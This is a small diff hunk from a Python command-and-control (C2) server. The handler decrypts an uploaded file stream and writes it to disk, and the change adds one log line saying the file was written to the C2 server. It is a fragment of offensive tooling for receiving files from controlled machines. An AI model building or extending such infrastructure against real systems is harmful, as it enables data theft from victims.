@@ -195,6 +195,7 @@ class C2Handler(BaseHTTPRequestHandler):
             # Read the file stream, decrypt it, and then write to disk
             with open(incoming_file, "wb") as file_handle:
                 file_handle.write(cipher.decrypt(self.rfile.read(file_length)))
+            print(f"{incoming_file} has been written to the c2 server.")
 
         # Nobody should ever be accessing to our c2 server using HTTP PUT
         else:
